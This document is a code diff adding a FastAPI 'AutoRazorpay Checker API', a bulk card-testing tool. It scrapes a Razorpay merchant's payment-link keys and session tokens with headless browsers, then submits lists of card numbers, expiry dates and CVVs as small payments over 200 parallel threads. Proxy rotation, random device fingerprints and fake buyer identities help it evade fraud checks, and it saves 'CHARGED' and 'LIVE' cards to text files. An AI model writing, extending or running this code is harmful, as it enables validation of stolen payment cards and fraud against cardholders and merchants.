@@ -1,3 +1,726 @@
+
+from fastapi import FastAPI
+from fastapi.middleware.cors import CORSMiddleware
+
+app = FastAPI()
+
+
+
+import asyncio
+import json
+import time
+import random
+import string
+import os
+import platform
+from datetime import datetime
+from typing import List, Optional, Dict, Any
+from urllib.parse import urlencode, urlparse, parse_qs
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+from fastapi import FastAPI, HTTPException, BackgroundTasks, Query
+from fastapi.responses import JSONResponse, StreamingResponse
+from pydantic import BaseModel, Field
+import httpx
+import requests
+from playwright.async_api import async_playwright
+# ============================================================
+# Configuration
+# ============================================================
+
+
+# Thread pool for concurrent operations - increased for max parallelism
+executor = ThreadPoolExecutor(max_workers=200)
+
+# Cache for merchant data and session tokens
+MERCHANT_CACHE: Dict[str, Any] = {}
+SESSION_TOKEN_CACHE: Dict[str, Any] = {}
+CACHE_TTL = 3600  # 1 hour
+
+PROXY_CONFIG = None
+
+
+# ============================================================
+# Pydantic Models
+# ============================================================
+
+class CardCheckRequest(BaseModel):
+    """Single card check request"""
+    card_number: str = Field(..., description="Card number")
+    exp_month: str = Field(..., description="Expiry month (MM)")
+    exp_year: str = Field(..., description="Expiry year (YY)")
+    cvv: str = Field(..., description="CVV")
+    site_url: str = Field(
+        default="https://razorpay.me/@instituteoftechnicalandscient",
+        description="Razorpay site URL"
+    )
+    amount: int = Field(default=1, description="Amount in rupees")
+    proxy: Optional[str] = Field(default=None, description="Proxy in format ip:port:user:pass")
+
+
+class StreamCheckRequest(BaseModel):
+    """Streaming card check request - live results"""
+    cards: List[str] = Field(..., description="List of cards in format card|mm|yy|cvv")
+    site_url: str = Field(
+        default="https://razorpay.me/@instituteoftechnicalandscient",
+        description="Razorpay site URL"
+    )
+    amount: int = Field(default=1, description="Amount in rupees")
+    proxy_list: Optional[List[str]] = Field(default=None, description="List of proxies")
+    save_results: bool = Field(default=True, description="Save results to files")
+
+
+class CheckResponse(BaseModel):
+    """Single check response"""
+    status: str = Field(..., description="CHARGED, LIVE, DECLINED, ERROR, etc")
+    message: str = Field(..., description="Result message")
+    payment_id: Optional[str] = Field(default=None, description="Razorpay payment ID")
+    elapsed_time: float = Field(..., description="Time taken in seconds")
+    card_masked: str = Field(..., description="Masked card number")
+    full_response: Dict[str, Any] = Field(default_factory=dict, description="Full API response")
+
+
+# ============================================================
+# Utility Functions
+# ============================================================
+
+def generate_device_fingerprint():
+    """Generate random device fingerprint"""
+    chars = string.ascii_letters + string.digits
+    return ''.join(random.choice(chars) for _ in range(128))
+
+
+def setup_proxy(proxy_string: Optional[str]) -> Optional[Dict]:
+    """Parse proxy string"""
+    if not proxy_string or proxy_string.strip() == "":
+        return None
+    try:
+        parts = proxy_string.strip().split(':')
+        if len(parts) == 4:
+            ip, port, user, pw = [p.strip() for p in parts]
+            if not all([ip, port, user, pw]):
+                return None
+            return {"server": f"http://{ip}:{port}", "username": user, "password": pw}
+        return None
+    except:
+        return None
+
+
+async def get_dynamic_session_token(proxy_config: Optional[Dict] = None):
+    """Get dynamic session token using Playwright"""
+    try:
+        async with async_playwright() as p:
+            browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if platform.system() == 'Linux' else []
+            browser = await p.chromium.launch(headless=True, proxy=proxy_config, args=browser_args)
+            page = await browser.new_page()
+            await page.set_extra_http_headers({
+                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+            })
+            await page.goto("https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1", timeout=30000)
+            await page.wait_for_url("**/checkout/public*session_token*", timeout=25000)
+            token = parse_qs(urlparse(page.url).query).get("session_token", [None])[0]
+            await browser.close()
+            return (token, None) if token else (None, "Token not found in URL.")
+    except Exception as e:
+        return None, f"Session token error: {str(e)[:100]}"
+
+
+async def extract_merchant_data(site_url: str, proxy_config: Optional[Dict] = None):
+    """Extract merchant data from Razorpay page"""
+    cache_key = site_url
+    if cache_key in MERCHANT_CACHE:
+        cache_entry = MERCHANT_CACHE[cache_key]
+        if time.time() - cache_entry['timestamp'] < CACHE_TTL:
+            return cache_entry['data'] + (None,)
+
+    merchant_match = None
+    import re
+    merchant_match = re.search(r'razorpay\.me/@([^/?]+)', site_url)
+    merchant_handle = merchant_match.group(1) if merchant_match else None
+
+    try:
+        async with async_playwright() as p:
+            browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if platform.system() == 'Linux' else []
+            browser = await p.chromium.launch(headless=True, proxy=proxy_config, args=browser_args)
+            page = await browser.new_page()
+            await page.set_extra_http_headers({
+                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+            })
+
+            intercepted = {}
+
+            def on_resp(r):
+                if "api.razorpay.com/v1/payment_links/merchant" in r.url:
+                    try:
+                        intercepted['data'] = r.json()
+                    except:
+                        pass
+
+            page.on("response", on_resp)
+            await page.goto(site_url, timeout=45000, wait_until='networkidle')
+            await page.wait_for_timeout(3000)
+
+            eval_data = await page.evaluate("""() => {
+                const d = window.data || window.__INITIAL_STATE__ || window.__CHECKOUT_DATA__ || window.razorpayData;
+                if (d && d.keyless_header) return d;
+
+                for (let k in window) {
+                    try {
+                        if (window[k] && typeof window[k] === 'object' && window[k].keyless_header) return window[k];
+                    } catch(e) {}
+                }
+
+                const scripts = document.querySelectorAll('script');
+                for (let s of scripts) {
+                    const txt = s.textContent || s.innerText;
+                    if (txt.includes('keyless_header') || txt.includes('payment_link')) {
+                        const matches = txt.match(/({[^{}]*(?:{[^{}]*}[^{}]*)*})/g);
+                        if (matches) {
+                            for (let match of matches) {
+                                try {
+                                    const parsed = JSON.parse(match);
+                                    if (parsed.keyless_header || parsed.key_id) return parsed;
+                                } catch (e) {}
+                            }
+                        }
+                    }
+                }
+                return null;
+            }""")
+            await browser.close()
+
+            final = eval_data or intercepted.get('data')
+            if final:
+                kh = final.get('keyless_header')
+                kid = final.get('key_id')
+                pl = final.get('payment_link') or final
+
+                if isinstance(pl, str):
+                    try:
+                        pl = json.loads(pl)
+                    except:
+                        pass
+
+                plid = pl.get('id') if isinstance(pl, dict) else final.get('payment_link_id')
+                ppi_list = pl.get('payment_page_items', []) if isinstance(pl, dict) else []
+                ppi = ppi_list[0].get('id') if ppi_list else final.get('payment_page_item_id')
+
+                if kh and kid and plid and ppi:
+                    result = (kh, kid, plid, ppi)
+                    MERCHANT_CACHE[cache_key] = {'data': result, 'timestamp': time.time()}
+                    return result + (None,)
+
+            if merchant_handle:
+                try:
+                    api_url = f"https://api.razorpay.com/v1/payment_links/merchant/{merchant_handle}"
+                    response = requests.get(api_url, timeout=10)
+                    if response.status_code == 200:
+                        api_data = response.json()
+                        kh = api_data.get('keyless_header')
+                        kid = api_data.get('key_id')
+                        plid = api_data.get('id')
+                        ppi = api_data.get('payment_page_items', [{}])[0].get('id')
+                        if kh and kid and plid and ppi:
+                            result = (kh, kid, plid, ppi)
+                            MERCHANT_CACHE[cache_key] = {'data': result, 'timestamp': time.time()}
+                            return result + (None,)
+                except:
+                    pass
+
+            return None, None, None, None, "Extraction failed."
+    except Exception as e:
+        return None, None, None, None, f"Extraction error: {str(e)[:100]}"
+
+
+def random_user_info():
+    """Generate random user info"""
+    return {
+        "name": "Test User",
+        "email": f"testuser{random.randint(100, 999)}@gmail.com",
+        "phone": f"9876543{random.randint(100, 999)}"
+    }
+
+
+def create_order(payment_link_id: str, amount_paise: int, payment_page_item_id: str) -> Optional[str]:
+    """Create order"""
+    url = f"https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order"
+    headers = {
+        "Accept": "application/json",
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+    }
+    payload = {
+        "notes": {"comment": ""},
+        "line_items": [{"payment_page_item_id": payment_page_item_id, "amount": amount_paise}]
+    }
+    try:
+        resp = requests.post(url, headers=headers, json=payload, timeout=15)
+        resp.raise_for_status()
+        return resp.json().get("order", {}).get("id")
+    except:
+        return None
+
+
+def submit_payment(order_id: str, card_info: tuple, user_info: dict, amount_paise: int, 
+                   key_id: str, keyless_header: str, payment_link_id: str, 
+                   session_token: str, site_url: str) -> requests.Response:
+    """Submit payment"""
+    card_number, exp_month, exp_year, cvv = card_info
+    url = "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
+    params = {
+        "key_id": key_id,
+        "session_token": session_token,
+        "keyless_header": keyless_header
+    }
+    headers = {
+        "x-session-token": session_token,
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0"
+    }
+    data = {
+        "notes[comment]": "",
+        "payment_link_id": payment_link_id,
+        "key_id": key_id,
+        "contact": f"+91{user_info['phone']}",
+        "email": user_info["email"],
+        "currency": "INR",
+        "_[library]": "checkoutjs",
+        "_[platform]": "browser",
+        "_[referer]": site_url,
+        "amount": amount_paise,
+        "order_id": order_id,
+        "device_fingerprint[fingerprint_payload]": generate_device_fingerprint(),
+        "method": "card",
+        "card[number]": card_number,
+        "card[cvv]": cvv,
+        "card[name]": user_info["name"],
+        "card[expiry_month]": exp_month,
+        "card[expiry_year]": exp_year,
+        "save": "0"
+    }
+    return requests.post(url, headers=headers, params=params, data=urlencode(data), timeout=20)
+
+
+def check_payment_status(payment_id: str, key_id: str, session_token: str, keyless_header: str) -> tuple:
+    """Check payment status"""
+    headers = {
+        'Accept': '*/*',
+        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        'Connection': 'keep-alive',
+        'Referer': 'https://api.razorpay.com/v1/checkout/public?traffic_env=production',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'x-session-token': session_token,
+    }
+    params = {
+        'key_id': key_id,
+        'session_token': session_token,
+        'keyless_header': keyless_header,
+    }
+    try:
+        r = requests.get(
+            f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}',
+            params=params, headers=headers, timeout=15
+        )
+        if r.status_code == 200:
+            data = r.json()
+            return data.get('status', 'unknown'), data
+        return 'unknown', {'error': f'Status check failed: {r.status_code}'}
+    except Exception as e:
+        return 'unknown', {'error': f'Status check error: {e}'}
+
+
+def cancel_payment(payment_id: str, key_id: str, session_token: str, keyless_header: str) -> dict:
+    """Cancel payment"""
+    headers = {
+        'Accept': '*/*',
+        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        'Connection': 'keep-alive',
+        'Content-type': 'application/x-www-form-urlencoded',
+        'Referer': 'https://api.razorpay.com/v1/checkout/public?traffic_env=production',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'x-session-token': session_token,
+    }
+    params = {
+        'key_id': key_id,
+        'session_token': session_token,
+        'keyless_header': keyless_header,
+    }
+    try:
+        r = requests.get(
+            f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel',
+            params=params, headers=headers, timeout=15
+        )
+        try:
+            return r.json()
+        except json.JSONDecodeError:
+            return {"error": {"description": f"Cancel HTTP {r.status_code}: {r.text[:200]}"}}
+    except Exception as e:
+        return {"error": {"description": f"Cancel request error: {e}"}}
+
+
+def parse_decline_reason(cancel_data: dict) -> str:
+    """Parse decline reason"""
+    if isinstance(cancel_data, dict) and "error" in cancel_data:
+        err = cancel_data["error"]
+        if isinstance(err, dict):
+            desc = err.get('description', 'Declined')
+            reason = err.get('reason', '')
+            code = err.get('code', '')
+            desc = desc.replace("%s", "Card")
+            parts = [desc]
+            if reason and reason != 'unknown':
+                parts.append(f"Reason: {reason}")
+            if code and code != 'N/A':
+                parts.append(f"Code: {code}")
+            return " | ".join(parts)
+        return str(err)
+    return json.dumps(cancel_data)[:100] if cancel_data else "Unknown decline reason"
+
+
+def process_card_sync(cc_line: str, plid: str, ppiid: str, kid: str, kh: str, 
+                      stoken: str, site_url: str, amount_paise: int) -> tuple:
+    """Process card (synchronous for executor) - optimized for speed"""
+    start = time.time()
+    try:
+        num, mm, yy, cvv = cc_line.strip().split('|')
+    except ValueError:
+        return "SKIP", "Invalid format (need card|mm|yy|cvv)", 0, {}, f"{cc_line[:10]}****"
+
+    try:
+        order_id = create_order(plid, amount_paise, ppiid)
+        if not order_id:
+            return "FAIL", "Order creation failed", round(time.time() - start, 2), {}, f"{num[:6]}****{num[-4:]}"
+
+        # Minimal delay for speed
+        time.sleep(0.1)
+
+        user_info = random_user_info()
+        response = submit_payment(
+            order_id, (num, mm, yy, cvv),
+            user_info, amount_paise, kid, kh, plid, stoken, site_url
+        )
+        pdata = response.json()
+
+    except Exception as e:
+        return "ERROR", f"Payment submission failed: {str(e)[:60]}", round(time.time() - start, 2), {}, f"{num[:6]}****{num[-4:]}"
+
+    pid = pdata.get("payment_id") or pdata.get("razorpay_payment_id")
+    masked = f"{num[:6]}****{num[-4:]}"
+
+    if pdata.get("redirect") == True or pdata.get("type") == "redirect":
+        rurl = pdata.get('request', {}).get('url') if isinstance(pdata.get('request'), dict) else None
+        if rurl and pid:
+            time.sleep(1)  # Only necessary delay for status check
+            stat, sdata = check_payment_status(pid, kid, stoken, kh)
+
+            if stat in ['captured', 'authorized']:
+                return "CHARGED", f"ID: {pid} | Status: {stat}", round(time.time() - start, 2), pdata, masked
+
+            if stat == 'failed':
+                reason = "Payment failed"
+                if isinstance(sdata, dict):
+                    err = sdata.get('error_description') or sdata.get('error', {}).get('description', '')
+                    if err:
+                        reason = err
+                return "DECLINED", f"ID: {pid} | {reason}", round(time.time() - start, 2), pdata, masked
+
+            if stat == 'created':
+                return "LIVE", f"ID: {pid} | 3DS/OTP Required", round(time.time() - start, 2), pdata, masked
+
+            cdata = cancel_payment(pid, kid, stoken, kh)
+            if isinstance(cdata, dict) and "error" in cdata:
+                err = cdata["error"]
+                if isinstance(err, dict):
+                    reason_code = err.get('reason', '')
+                    desc = err.get('description', '')
+                    if reason_code == 'payment_cancelled':
+                        return "LIVE", f"ID: {pid} | 3DS/OTP Required", round(time.time() - start, 2), pdata, masked
+                    else:
+                        return "DECLINED", f"ID: {pid} | {desc}", round(time.time() - start, 2), pdata, masked
+
+            reason = parse_decline_reason(cdata)
+            return "DECLINED", f"ID: {pid} | {reason}", round(time.time() - start, 2), pdata, masked
+
+        return "FAIL", f"3DS redirect missing", round(time.time() - start, 2), pdata, masked
+
+    if "razorpay_signature" in pdata or "signature" in pdata:
+        return "CHARGED", f"ID: {pid} | Immediate success", round(time.time() - start, 2), pdata, masked
+
+    if "error" in pdata:
+        err = pdata.get('error', {})
+        if isinstance(err, dict):
+            desc = err.get('description', 'Unknown error').replace("%s", "Card")
+            code = err.get('code', 'N/A')
+            reason = err.get('reason', '')
+            msg = f"{desc} (Code: {code})"
+            if reason:
+                msg += f" [Reason: {reason}]"
+            if pid:
+                msg = f"ID: {pid} | {msg}"
+            return "DECLINED", msg, round(time.time() - start, 2), pdata, masked
+        return "DECLINED", f"Error: {json.dumps(err)[:80]}", round(time.time() - start, 2), pdata, masked
+
+    return "UNKNOWN", f"Response: {json.dumps(pdata)[:100]}", round(time.time() - start, 2), pdata, masked
+
+
+# ============================================================
+# API Routes
+# ============================================================
+
+@app.get("/")
+async def root():
+    """API documentation"""
+    return {
+        "service": "AutoRazorpay Checker API",
+        "version": "2.0",
+        "endpoints": {
+            "POST /rz/check": "Single card check",
+            "POST /rz/stream": "Stream card checks (live results)",
+            "GET /health": "Health check"
+        },
+        "author": "@technopile"
+    }
+
+
+@app.get("/health")
+async def health():
+    """Health check endpoint"""
+    return {
+        "status": "healthy",
+        "timestamp": datetime.now().isoformat(),
+        "service": "AutoRazorpay Checker API v2.0"
+    }
+
+
+@app.post("/rz/check", response_model=CheckResponse)
+async def check_single_card(request: CardCheckRequest):
+    """
+    Check a single card
+    
+    Example:
+    {
+        "card_number": "5315425239031360",
+        "exp_month": "11",
+        "exp_year": "27",
+        "cvv": "085",
+        "site_url": "https://razorpay.me/@instituteoftechnicalandscient",
+        "amount": 1
+    }
+    """
+    try:
+        proxy_config = setup_proxy(request.proxy) if request.proxy else None
+
+        # Extract merchant data
+        kh, kid, plid, ppiid, err = await extract_merchant_data(request.site_url, proxy_config)
+        if err:
+            raise HTTPException(status_code=400, detail=f"Merchant extraction failed: {err}")
+
+        # Get session token
+        stoken, err = await get_dynamic_session_token(proxy_config)
+        if err:
+            raise HTTPException(status_code=400, detail=f"Session token failed: {err}")
+
+        # Process card
+        cc_line = f"{request.card_number}|{request.exp_month}|{request.exp_year}|{request.cvv}"
+        amount_paise = request.amount * 100
+
+        tag, msg, elapsed, full_resp, masked = await asyncio.get_event_loop().run_in_executor(
+            executor, process_card_sync, cc_line, plid, ppiid, kid, kh, stoken, request.site_url, amount_paise
+        )
+
+        return CheckResponse(
+            status=tag,
+            message=msg,
+            payment_id=full_resp.get("payment_id") or full_resp.get("razorpay_payment_id"),
+            elapsed_time=elapsed,
+            card_masked=masked,
+            full_response=full_resp
+        )
+
+    except HTTPException:
+        raise
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+
+
+@app.post("/rz/stream")
+async def stream_card_checks(request: StreamCheckRequest, background_tasks: BackgroundTasks):
+    """
+    Stream card checks with live results (Server-Sent Events)
+    
+    Results are sent as they complete for real-time frontend updates.
+    
+    Example:
+    {
+        "cards": [
+            "5315425239031360|11|27|085",
+            "4532015112830366|12|26|123"
+        ],
+        "site_url": "https://razorpay.me/@instituteoftechnicalandscient",
+        "amount": 1,
+        "save_results": true
+    }
+    """
+    async def event_generator():
+        try:
+            if not request.cards:
+                yield f"data: {json.dumps({'error': 'No cards provided'})}\n\n"
+                return
+
+            if len(request.cards) > 1000:
+                yield f"data: {json.dumps({'error': 'Maximum 1000 cards per request'})}\n\n"
+                return
+
+            # Setup proxy pool
+            proxy_pool = request.proxy_list if request.proxy_list else [None]
+            proxy_configs = [setup_proxy(p) if p else None for p in proxy_pool]
+
+            # Extract merchant data once
+            kh, kid, plid, ppiid, err = await extract_merchant_data(request.site_url, proxy_configs[0])
+            if err:
+                yield f"data: {json.dumps({'error': f'Merchant extraction failed: {err}', 'type': 'fatal'})}\n\n"
+                return
+
+            # Get session token
+            stoken, err = await get_dynamic_session_token(proxy_configs[0])
+            if err:
+                yield f"data: {json.dumps({'error': f'Session token failed: {err}', 'type': 'fatal'})}\n\n"
+                return
+
+            # Send start event
+            yield f"data: {json.dumps({'type': 'start', 'total': len(request.cards), 'timestamp': datetime.now().isoformat()})}\n\n"
+
+            amount_paise = request.amount * 100
+            charged_cards = []
+            live_cards = []
+            completed = 0
+
+            # Process cards in parallel with maximum concurrency
+            def process_card_wrapper(card):
+                return process_card_sync(
+                    card, plid, ppiid, kid, kh, stoken, request.site_url, amount_paise
+                )
+
+            loop = asyncio.get_event_loop()
+            
+            # Create tasks with their corresponding cards
+            tasks = [(card, loop.run_in_executor(executor, process_card_wrapper, card)) for card in request.cards]
+
+            # Stream results as they complete
+            for done in asyncio.as_completed([task[1] for task in tasks]):
+                completed += 1
+                
+                # Find which card this task corresponds to
+                card = None
+                for c, task in tasks:
+                    if task == done:
+                        card = c
+                        break
+                
+                try:
+                    tag, msg, elapsed, full_resp, masked = await done
+                    
+                    result = {
+                        "type": "result",
+                        "card": masked,
+                        "status": tag,
+                        "message": msg,
+                        "payment_id": full_resp.get("payment_id") or full_resp.get("razorpay_payment_id"),
+                        "elapsed": elapsed,
+                        "progress": f"{completed}/{len(request.cards)}",
+                        "timestamp": datetime.now().isoformat()
+                    }
+                    
+                    # Collect for file saving
+                    if tag == "CHARGED":
+                        charged_cards.append(f"{card} | {msg}")
+                    elif tag == "LIVE":
+                        live_cards.append(f"{card} | {msg}")
+                    
+                    # Stream to frontend immediately
+                    yield f"data: {json.dumps(result)}\n\n"
+                    
+                except Exception as e:
+                    yield f"data: {json.dumps({'type': 'error', 'card': str(card)[:10] if card else 'unknown', 'error': str(e)})}\n\n"
+
+            # Save results in background if needed
+            if request.save_results:
+                def save_results_task():
+                    if charged_cards:
+                        with open("charged.txt", "a") as f:
+                            for card in charged_cards:
+                                f.write(f"{card} | {datetime.now().isoformat()}\n")
+                    if live_cards:
+                        with open("lives.txt", "a") as f:
+                            for card in live_cards:
+                                f.write(f"{card} | {datetime.now().isoformat()}\n")
+
+                background_tasks.add_task(save_results_task)
+
+            # Send completion event
+            stats = {
+                "type": "complete",
+                "total": len(request.cards),
+                "charged": len(charged_cards),
+                "live": len(live_cards),
+                "timestamp": datetime.now().isoformat()
+            }
+            yield f"data: {json.dumps(stats)}\n\n"
+
+        except Exception as e:
+            yield f"data: {json.dumps({'type': 'fatal_error', 'error': str(e)})}\n\n"
+
+    return StreamingResponse(
+        event_generator(),
+        media_type="text/event-stream",
+        headers={
+            "Cache-Control": "no-cache",
+            "X-Accel-Buffering": "no",
+            "Connection": "keep-alive"
+        }
+    )
+
+
+@app.get("/rz/stats")
+async def get_stats():
+    """Get API statistics"""
+    return {
+        "cache_entries": len(MERCHANT_CACHE),
+        "timestamp": datetime.now().isoformat(),
+        "max_workers": 200,
+        "cache_ttl": CACHE_TTL,
+        "streaming_enabled": True
+    }
+
+
+# ============================================================
+# Error Handlers
+# ============================================================
+
+@app.exception_handler(HTTPException)
+async def http_exception_handler(request, exc):
+    return JSONResponse(
+        status_code=exc.status_code,
+        content={"detail": exc.detail, "timestamp": datetime.now().isoformat()}
+    )
+
+
+@app.exception_handler(Exception)
+async def general_exception_handler(request, exc):
+    return JSONResponse(
+        status_code=500,
+        content={"detail": "Internal server error", "error": str(exc), "timestamp": datetime.now().isoformat()}
+    )
+
+
+    
+# To run with multiple workers, use CLI:
+# python -m uvicorn api_rz:app --host 0.0.0.0 --port 8000 --workers 4 --loop uvloop
+
+
+
+
+
 import asyncio
 import aiohttp
 import json
@@ -1026,8 +1749,6 @@ import uvicorn
 import asyncio
 import time
 
-app = FastAPI()
-
 app.add_middleware(
     GZipMiddleware,
     minimum_size=1000
@@ -1234,34 +1955,16 @@ async def shopify_batch(
     }
 
 
-# =========================
-# START
-# =========================
 
-if __name__ == "__main__":
 
+
+
+if __name__=='__main__':
+    import uvicorn
     uvicorn.run(
-        "Autoshopify:app",
+        app,
         host="0.0.0.0",
-        port=5000,
-
-        workers=1,
-
-        loop="asyncio",
-
-        http="httptools",
-
-        access_log=False,
-
-        server_header=False,
-
-        date_header=False,
-
-        ws="none",
-
-        timeout_keep_alive=30,
-
-        limit_concurrency=1000,
-
-        backlog=2048
+        port=8000,
+        log_level="info",
+        access_log=True
     )
